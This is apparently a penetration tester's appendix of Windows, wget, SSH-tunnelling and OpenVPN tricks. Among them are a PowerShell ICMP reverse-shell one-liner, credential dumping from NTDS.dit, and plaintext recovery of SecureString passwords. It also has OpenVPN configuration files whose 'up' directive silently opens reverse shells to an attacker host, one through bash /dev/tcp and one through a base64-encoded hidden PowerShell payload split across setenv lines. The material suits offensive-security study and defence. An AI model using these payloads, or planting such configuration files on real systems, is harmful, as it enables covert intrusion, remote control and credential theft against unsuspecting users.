# Appendix

## Tips and Tricks

### Windows

#### Get-ChildItem Mode Values

'Mode' values returned by PowerShell's Get-ChildItem cmdlet?

```none
PS> gci|select mode,attributes -u

Mode                Attributes
----                ----------
d-----               Directory
d-r---     ReadOnly, Directory
d----l Directory, ReparsePoint
-a----                 Archive
```

In any case, the full list is:

```none
d - Directory
a - Archive
r - Read-only
h - Hidden
s - System
l - Reparse point, symlink, etc.
```

#### Zip or unzip using ONLY Windows' built-in capabilities?

Powershell way

```none
Add-Type -A System.IO.Compression.FileSystem
[IO.Compression.ZipFile]::CreateFromDirectory('foo', 'foo.zip')
[IO.Compression.ZipFile]::ExtractToDirectory('foo.zip', 'bar')
```

#### Alternate Data Stream

Sometimes, [Alternate Data Stream](https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/) can be used to hide data in streams.

The output shows not only the name of the ADS and its size, but also the unnamed data stream and its size is also listed (shown as :$DATA).

Powershell-Way

```none
PS > Get-Item -Path C:\Users\Administrator\example.zip -stream *

Filename: C:\Users\Administrator\example.zip

Stream             Length
------             -------
:$DATA             8
pass.txt           4
```

Now, we know the name of the ADS, We can use the Get-Content cmdlet to query its contents.

```none
Get-Content -Path C:\Users\Administrator\example.zip -Stream pass.txt
The password is Passw0rd!
```

Check a directory for ADS?

```none
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
```

DIR Way

Current directory ADS Streams

```none
dir /r | find ":$DATA"
```

Sub-directories too

```none
dir   /s /r | find ":$DATA"
```

Reading the hidden stream

```none
more < testfile.txt:hidden_stream::$DATA
```

We may also utilze [List Alternate Data Streams](https://github.com/codejanus/ToolSuite/blob/master/lads.exe) LADS tool to figure out Alternate Data Streams.

#### Redirecting Standard Out and Standard Error from PowerShell Start-Process

Often reverse shells will not display standard error. Sometimes they will not display standard out when a new process is started. The following will redirect standard out and standard error to text files when PowerShell starts a new process.

```none
PS C:\> Start-Process -FilePath C:\users\administrator\foo.txt -NoNewWindow -PassThru -Wait -RedirectStandardOutput stdout.txt -RedirectStandardError stderr.txt
```

[Powershell Start-Process Module Documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process).

#### NTDS.dit and SYSTEM hive

If you have found files such as

```none
IP_psexec.ntdsgrab._333512.dit: Extensible storage engine DataBase, version 0x620, checksum 0x16d44752, page size 8192, DirtyShutdown, Windows version 6.1
IP_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above
```

Probably, there are dump of domain controller NTDS.dit file, from which passwords can be extracted. Utilize,

```none
python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL
```

#### ICMP Shell

Sometimes, inbound and outbound traffic from any port is disallowed and only ICMP traffic is allowed. In that case, we can use [Simple reverse ICMP Shell](https://github.com/inquisb/icmpsh) However, this requires the executable to be present on the system. There's a powershell version of [ICMP Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1) Sometimes, probably, we can execute powershell code on the machine. In that case, we can use the one-liner powershell code to execute the shell.

```none
powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"
```

The above code is basically a reduced version of the powershell version of ICMP and have a limited buffer (which means commands whose output is greater than the buffer, won't be displayed!). Now, there's a painful way of transferring files to the victim system which is

- Convert the file/ code which needs to be transferred in to base64. (If possible, remove all the unnecessary code/ comments, this would help us to reduce the length of the base64). Do make sure that your base64 when converted back is correct! Refer [PowerShell –EncodedCommand and Round-Trips](https://blogs.msdn.microsoft.com/timid/2014/03/26/powershell-encodedcommand-and-round-trips/)
- Utilize the [Add-Content cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-5.1) to transfer the file to the victim system. Do, remember to transfer the data in chunks as we have limited buffer! Probably, we have to run the below command twice or thrice to transfer the whole base64-encoded chunk.

```none
Add-Content <filename> "Base64 encoded content"
```

- Once the base64-encoded data is transferred, we can utilize [certutil](https://technet.microsoft.com/en-us/library/cc732443(v=ws.11).aspx) from Microsoft to decode the base64-encoded to normal file.

```none
certutil <-decode/ -encode> <input file> <output file>
-decode Decode a Base64-encoded file
-encode Encode a file to Base64
```

- Now, we can execute the file (assuming powershell ps1 file) to get the full powershell ICMP reverse shell with buffer management so, we would be able to get full output of the commands.

- Now, most of the time after getting the intial shell, probably, we would have figured out user credentials ( let's say from www-data or iisapppool user to normal/ admin user credentials. ) At this point of time, we can use the below code to create a PSCredential.

```none
$username = 'UsernameHere';
$password = 'PasswordHere';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,$securePassword 
```

- Once, we have created a PSCredential, we can use [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command) to execute command as that user.

```none
Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {Command to be executed}
-ComputerName localhost is required as the code is to be executed on localhost, without -ComputerName, InvokeCommand doesn't work.
```

- Possibly, we can execute the ICMP Shell code to get the shell as the new user.

- One problem, which we gonna face is, when we are running ICMP Shell with different users for example, first with IISWebpool, then with User1, then with user2, we would get multple times IISWebpool as that powershell process (on UDP) is still running. One way to this is Just before launching a new ICMP shell as a different user.
  
  - Check powershell processes with Show-Process

  ```none
  Show-Process -Name *power* "
  ```

  - Note down  the PID
  - Execute shell as the different user
  - Stop-Process the previous PID

#### Recovering password from System.Security.SecureString

If we have windows credentials stored as System.Security.SecureString, we can use

```none
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
```

or

```none
$UnsecurePassword = (New-Object PSCredential "user",$SecurePassword).GetNetworkCredential().Password
```

Example:

```none
PS> $PlainPassword = Read-Host -AsSecureString  "Enter password"
PS> Enter password: ***
PS> $PlainPassword
PS> System.Security.SecureString
PS> $UnsecurePassword1 = (New-Object PSCredential "user",$PlainPassword).GetNetworkCredential().Password
PS> $UnsecurePassword1
PS> yum
```

#### Copy To or From a PowerShell Session

This is a awesome feature to copy files from different computers on which we have a WinRM or Remote PS Session. Directly taken from [Copy To or From a PowerShell Session](https://blogs.technet.microsoft.com/poshchap/2015/10/30/copy-to-or-from-a-powershell-session/)

- Copy Local files to a remote session :

  ```none
  ##Initialize the session
  $TargetSession = New-PSSession -ComputerName HALOMEM03

  ##  Copy Files from Local session to remote session
  Copy-Item -ToSession $TargetSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator.HALO\desktop\" -Recurse
  ```

- Copy some files from a remote session to the local server:

  ```none
  ## Create the session
  $SourceSession = New-PSSession -ComputerName HALODC01

  ## Copy from Remote machine to Local machine
  Copy-Item -FromSession $SourceSession -Path "C:\Users\Administrator\desktop\scripts\" -Destination "C:\Users\administrator\desktop\" -Recurse
  ```

#### Get-Hash

[Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash) Computes the hash value for a file by using a specified hash algorithm.

```none
PS > Get-FileHash Hello.rst

Algorithm Hash                                                              Path
--------- ----                                                              ----
SHA256    8A7D37867537DB78A74A473792928F14EDCB3948B9EB11A48D6DE38B3DD30EEC  /tmp/Hello.rst
```

#### Active Directory Enumeration and Remote Code Execution

Probably, refer  :doc:`LFF-IPS-P3-Exploitation`

It contains

- Active Directory Reconnaissance : Information about active directory enumeration with Domain User rights by various methods such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell, powershell adsisearcher etc.
- Remote Code Execution Methods : Information about multiple ways to get a execute remote commands on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc.

#### Others

- Invoking Net Use using Credentials to mount remote system

  The below example executes command on file.bitvijays.local computer with Domain Administrator credentials and utilizes net use to mount Domain Controller C Drive and read a particular file

  ```none
  Invoke-Command -ComputerName file.bitvijays.local -Credential $credential -ScriptBlock {net use x: \\dc.bitvijays.local\C$ /user:bitvijays.local\domainadministrator_user DA_Passw0rd!; type x:\users\administrator\desktop\imp.txt}
  ```

### Wget

#### FTP via Wget

If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)

```none
wget -rq ftp://IP --ftp-user=username --ftp-password=password
```

#### wgetrc Commands

```none
output_document = file -- Set the output filename—the same as ‘-O file’.
post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
-P prefix
--directory-prefix=prefix
Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).
```

#### Tricks

- The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let's say, your current directory is /home/user/ if we do

  ```none
  wget IPAddress -P tmp
  ```

  it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.

- wget accepts IP address in decimal format

- wget shortens the filename if it's too long. For example, if you provide a filename to the wget which is very long (i.e around 255 character), wget might shorten it. This might be helpful in cases where only a jpg file is allowed to be uploaded, however as wget shortens it, we may try aaaaaaaaaaaa (*255/ somenumber).php.jpg and wget shortens it to aaaaaaa(*255).php

### SSH

#### ssh_config

If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.

```none
## Tighten security after security incident
## root never gets to log in remotely PermitRootLogin no
## Eugene & Margo can SSH in, no-one else allowed
AllowUsers example_user1 example_user2
## SSH keys only but example_user1 can use a password
Match user example_user1
PasswordAuthentication yes
## End tighten security
```

### SSH Tunneling

SSH protocol, which supports bi-directional communication channels can create encrypted tunnels.

#### Local Port Forwarding

SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.

```none
ssh sshserver -L <local port to listen>:<remote host>:<remote port>
```

Example:

Imagine we’re on a private network which doesn’t allow connections to a specific server. Let’s say you’re at work and youtube is being blocked. To get around this we can create a tunnel through a server which isn’t on our network and thus can access Youtube.

```none
$ssh -L 9000:imgur.com:80 user@example.com
```

The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to <http://localhost:9000>

**Syntax**

```none
-L [bind_address:]port:host:hostport
-L [bind_address:]port:remote_socket
-L local_socket:host:hostport
-L local_socket:remote_socket
        Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on the local side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port
        hostport, or the Unix socket remote_socket, from the remote machine.

        Port forwardings can also be specified in the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address in square brackets.

        By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be bound for local use only, while an empty address or ‘*’ indicates that the port should be available from all interfaces.
```

To share a interesting case, Let's say there's a host which is running port 22 on all interfaces and port 8080 and 8081 (or any other port) on local loopback interface (127.0.0.1), something like

```none
tcp4       0      0 *.ssh                  *.*                    LISTEN
tcp6       0      0 *.ssh                  *.*                    LISTEN
tcp4       0      0 localhost.8080         *.*                    LISTEN
tcp4       0      0 localhost.8081         *.*                    LISTEN
```

Now, webserver on port 8080 and 8081 are running on localhost, if we have ssh access to the machine, we can tunnel them via local port forwarding and run it on the ethernet interface.

```none
ssh -L IP_Address_of_Machine:<Port-which-we-want-to-open-Let's say-9000>:127.0.0.1:<localhost-port-which-we-want-to-map-let's-say-8080> user@IP_Address_of_Machine
```

It would become

```none
ssh -L 10.10.10.10:9000:127.0.0.1:8080 user@10.10.10.10 and
ssh -L 10.10.10.10:9001:127.0.0.1:8081 user@10.10.10.10
```

The above would open port 9000 and 9001 (on the external interface) and map it to port 8080 and 8081(which were running on local/ loopback interface).

#### Remote Port Forwarding

SSH remote port forwarding allows us to tunnel a remote port to a local server.

```none
ssh sshserver -R <remote port to bind>:<local host>:<local port>
```

Example:

Let's say there's a wordpress web-application we have compromised and have a www-data shell. Also, let's say, we are inside a docker environment with the network below

```none
172.16.0.1 Host-Machine
172.16.0.2 WordPress
172.16.0.3 Joomla
172.16.0.4 Mysql
```

Now, Let's say, we have root credentials of mysql and want to access it using dbeaver application. Now, as we have access of wordpress machine, we can basically ssh to our machine (Let's say our IP is 10.10.15.111), creating a Remote Port Forward

```none
ssh bitvijays@10.10.15.111 -R 3306:172.16.0.4:3306
```

The above would create a ssh tunnel between 10.10.15.111:3306 and 172.16.0.4:3306. Then, we would be able to just launch dbeaver and connect to localhost mysql and browse the database at 172.16.0.4:3306.

As we would be probably inside the docker and www-data user, we might not have ssh binary and proper environment variable in that case, we can add below options

```none
./ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i id_rsa -R 3306:172.16.0.4:3306 -fN bitvijays@10.10.15.111
```

#### SSH as SOCKS Proxy

We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.

```none
ssh -D localhost:9050 user@host

-D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.
```

and

```none
proxychains4 remmina/ rdesktop
```

If we have to share a interesting story with you, Recently, We were assigned a engagment to compromise a industrial plant. Let us walkthru what's the scenario.
Scenario:

- Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)
- As it's a industrial plant, there's a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 -- This is NATTed IP)

#### VPN-like tunnelling?

[sshuttle](https://github.com/sshuttle/sshuttle) Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.

So if we have a access to device at 10.1.1.1, and it also has an interface on 192.168.122.0/24 with other hosts behind it, we can run:

```none
# sshuttle -r root@10.1.1.1 192.168.122.0/24
root@10.1.1.1's password:
client: Connected.
```

This creates a VPN-like connection, allowing me to visit 192.168.122.4 in a browser or with curl, and see the result.

Probably, nmap won't be a good idea to run over sshuttle, however, it is a very nice way to interact with a host over a tunnel.

#### SCP

To copy all from Local Location to Remote Location (Upload)

```none
scp -r /path/from/destination username@hostname:/path/to/destination
```

To copy all from Remote Location to Local Location (Download)

```none
scp -r username@hostname:/path/from/destination /path/to/destination
```

Help:

- -r Recursively copy all directories and files
- Always use full location from /, Get full location by pwd
- scp will replace all existing files
- hostname will be hostname or IP address
- If custom port is needed (besides port 22) use -P portnumber
- . (dot) - it means current working directory, So download/copy from server and paste here only.

### Plink

Plink is a windows command-line connection tool similar to UNIX ssh.

```none
plink
Plink: command-line connection utility
Release 0.68
Usage: plink [options] [user@]host [command]
      ("host" can also be a PuTTY saved session name)
Options:
  -V        print version information and exit
  -v        show verbose messages
  -load sessname  Load settings from saved session
  -ssh -telnet -rlogin -raw -serial
            force use of a particular protocol
  -P port   connect to specified port
  -l user   connect with specified username
The following options only apply to SSH connections:
  -pw passw login with specified password
  -D [listen-IP:]listen-port
            Dynamic SOCKS-based port forwarding
  -L [listen-IP:]listen-port:host:port
            Forward local port to remote address
  -R [listen-IP:]listen-port:host:port
            Forward remote port to local address
  -X -x     enable / disable X11 forwarding
  -A -a     enable / disable agent forwarding
  -t -T     enable / disable pty allocation
  -C        enable compression
  -i key    private key file for user authentication
  -m file   read remote command(s) from file
  -N        don't start a shell/command (SSH-2 only)
  -nc host:port
            open tunnel in place of session (SSH-2 only)
```

It can also be used to perform SSH tunnelling, have a look at -L, -R and -D options. On Kali Linux box it is present at /usr/share/windows-binaries/plink.exe

### OpenVPN Configuration File Reverse Shell?

Taken from [Reverse Shell from an OpenVPN Configuration File](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da)

An ovpn file is a configuration file provided to the OpenVPN client or server. The file details everything about the VPN connection: which remote servers to connect to, the crypto to use, which protocols, the user to login as, etc.

At its most simple form, an ovpn file looks like the this:

```none
remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1
dev tun
```

This directs the client to connect to the server at 192.168.1.245 without authentication or encryption and establish the tun interface for communication between the client (10.200.0.2) and the server (10.200.0.1).

The OpenVPN configuration feature is important is the up command. This is how the manual describes it:

```none
Run command cmd after successful TUN/TAP device open (pre — user UID change).
cmd consists of a path to script (or executable program), optionally followed by arguments. The path and arguments may be single- or double-quoted and/or escaped using a backslash, and should be separated by one or more spaces.
```

Basically, the up command will execute any binary of script you point it to

#### Linux

If the victim is using a version of Bash that supports /dev/tcp then getting a reverse shell is trivial. The following ovpn file will background a reverse shell to 192.168.1.218:8181.

```none
remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.1.218/8181 0<&1 2>&1 &'"
```

When this ovpn file is used it won’t be obvious to the user that something is wrong. The VPN connection is established normally and traffic flows. There are only two indications in the log that perhaps something is afoot.

```none
Thu Jun 7 12:28:23 2018 NOTE: the current — script-security setting may allow this configuration to call user-defined scripts
Thu Jun 7 12:28:23 2018 ******* WARNING *******: All encryption and authentication features disabled — All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
```

Even if the the user does see these log entries a reverse shell has already been established with our listener on 192.168.1.218:

```none
albinolobster@ubuntu:~$ nc -lvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.1.247] port 8181 [tcp/*] accepted (family 2, sport 54836)
root@client:/home/client/openvpn# id
id
uid=0(root) gid=0(root) groups=0(root)
```

#### Windows

Windows doesn’t have an analogous /dev/tcp feature. We’ll have to work a little harder to generate a reverse shell from a Windows host.

Fortunately, Dave Kennedy of TrustedSec wrote a small [powershell reverse shell](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell) that we can use. Using powershell.exe’s -EncodedCommand
parameter we can pass the entire script on the command line. First, however, we’ll need to base64 encode the script to avoid having to insert escapes. Our old friend Carlos Perez has a script called [ps_encoder.py](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py)
that will do the encoding for us.

However, there is a problem. The encoded reverse shell script is over 4000 characters long and OpenVPN has a 256 character limitation. To get around this we can use the setenv command to split up the script and then recombine it in the up command. Consider the following ovpn file:

```none
ifconfig 10.200.0.2 10.200.0.1
dev tun
remote 192.168.1.245
script-security 2
setenv z1 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
setenv a1 ‘ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsADQAKAGkAZgAgACgAJABjAGwAaQBlAG4AdAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAfQANAAoAaQBmACAAKAAkAHAAcgBvAGMAZQBzAHMALgBFAHgAaQB0AEM’
setenv b1 ‘AbwBkAGUAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAkAHAAcgBvAGMAZQBzAHMALgBDAGwAbwBzAGUAKAApAH0ADQAKAGUAeABpAHQAfQANAAoAJABhAGQAZAByAGUAcwBzACAAPQAgACcAMQA5ADIALgAxADYAOAAuADEALgAyADEAOAAnAA0ACgAkAHAAbwByAHQAIAA9ACAAJwA4ADEAOAAxACcADQAKACQAYwBsAG’
setenv c1 ‘kAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgBzAG8AYwBrAGUAdABzAC4AdABjAHAAYwBsAGkAZQBuAHQADQAKACQAYwBsAGkAZQBuAHQALgBjAG8AbgBuAGUAYwB0ACgAJABhAGQAZAByAGUAcwBzACwAJABwAG8AcgB0ACkADQAKACQAcwB0AHIAZQBhAG0AIAA9A’
setenv d1 ‘CAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQANAAoAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJABjAGwAaQBlAG4AdAAuAFIAZQBjAGUAaQB2AGUAQgB1AGYAZgBlAHIAUwBpAHoAZQAN’
setenv e1 ‘AAoAJABwAHIAbwBjAGUAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMADQAKACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACcAQwA6AFwAXAB3AGkAbgB’
setenv f1 ‘kAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUAJwANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAAxAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQASQBuAGYAbw’
setenv g1 ‘AuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAIAA9ACAAMQANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAgAD0AIAAwAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQAKAApAA0ACgAkAGkAb’
setenv h1 ‘gBwAHUAdABzAHQAcgBlAGEAbQAgAD0AIAAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQBuAGQAYQByAGQASQBuAHAAdQB0AA0ACgAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtACAAPQAgACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAA’
setenv i1 ‘MQANAAoAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcADQAKAHcAaABpAGwAZQAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBQAGUAZQBrACgAKQAgAC0AbgBlACAALQAxACkAewAkAG8’
setenv j1 ‘AdQB0ACAAKwA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsAD’
setenv k1 ‘AALAAkAG8AdQB0AC4ATABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwAOwAgACQAZABvAG4AZQAgAD0AIAAkAGYAYQBsAHMAZQA7ACAAJAB0AGUAcwB0AGkAbgBnACAAPQAgADAAOwANAAoAdwBoAGkAbABlACAAKAAtAG4AbwB0ACAAJABkAG8AbgBlACkAIAB7AA0ACgBpAGYAIAAoACQAYwBsA’
setenv l1 ‘GkAZQBuAHQALgBDAG8AbgBuAGUAYwB0AGUAZAAgAC0AbgBlACAAJAB0AHIAdQBlACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAJABwAG8AcwAgAD0AIAAwADsAIAAkAGkAIAA9ACAAMQANAAoAdwBoAGkAbABlACAAKAAoACQAaQAgAC0AZwB0ACAAMAApACAALQBhAG4AZAAgACgAJABwAG8AcwAgAC0AbAB0ACAAJABu’
setenv m1 ‘AGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQApACAAewANAAoAJAByAGUAYQBkACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACwAJABwAG8AcwAsACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACAALQA’
setenv n1 ‘gACQAcABvAHMAKQANAAoAJABwAG8AcwArAD0AJAByAGUAYQBkADsAIABpAGYAIAAoACQAcABvAHMAIAAtAGEAbgBkACAAKAAkAG4AZQB0AHcAbwByAGsAYgB1AGYAZgBlAHIAWwAwAC4ALgAkACgAJABwAG8AcwAtADEAKQBdACAALQBjAG8AbgB0AGEAaQBuAHMAIAAxADAAKQApACAAewBiAHIAZQBhAGsAfQB9AA0ACg’
setenv o1 ‘BpAGYAIAAoACQAcABvAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAsADAALAAkAHAAbwBzACkADQAKACQAaQBuAHAAdQB0AHMAdAByAGUAYQBtAC4AdwByAGkAd’
setenv p1 ‘ABlACgAJABzAHQAcgBpAG4AZwApAA0ACgBzAHQAYQByAHQALQBzAGwAZQBlAHAAIAAxAA0ACgBpAGYAIAAoACQAcAByAG8AYwBlAHMAcwAuAEUAeABpAHQAQwBvAGQAZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAZQBsAHMAZQAgAHsADQAKACQAbwB1AHQAIAA9ACAAJABlAG4A’
setenv q1 ‘YwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAA0ACgB3AGgAaQBsAGUAKAAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtAC4AUABlAGUAawAoACkAIAAtAG4AZQAgAC0AMQApAHsADQAKACQAbwB1AHQAIAArAD0AIAAkAGUAbgBjAG8’
setenv r1 ‘AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAHUAdABwAHUAdABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAApACkAOwAgAGkAZgAgACgAJABvAHUAdAAgAC0AZQBxACAAJABzAHQAcgBpAG4AZwApACAAewAkAG8AdQB0ACAAPQAgACcAJwB9AH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAG’
setenv s1 ‘UAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsADAALAAkAG8AdQB0AC4AbABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABuAHUAbABsAH0AfQAgAGUAbABzAGUAIAB7AGMAbABlAGEAbgB1AHAAfQB9AA==’
up 'C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1% ) ||'
```

We can see the encoded script has been split over a setenv commands. At the very end, the script just runs all the environment variables together.

Result

```none
albinolobster@ubuntu:~$ nc -lvp 8181
Listening on [0.0.0.0] (family 0, port 8181)
Connection from [192.168.1.226] port 8181 [tcp/*] accepted (family 2, sport 51082)
Microsoft Windows [Version 10.0.17134.48]
© 2018 Microsoft Corporation. All rights reserved.
C:\Users\albinolobster\OpenVPN\config\albino_lobster>whoami
desktop-r5u6pvd\albinolobster
C:\Users\albinolobster\OpenVPN\config\albino_lobster>
```

Using untrusted ovpn files is dangerous. You are allowing a stranger to execute arbitrary commands on your computer. Some OpenVPN compatible clients like Viscosity and Ubuntu’s Network Manager GUI disable this behavior.

### HTTP

#### First things

- View Source of the web-page (Ctrl+U).
- Inspect element of the web-page (F12).
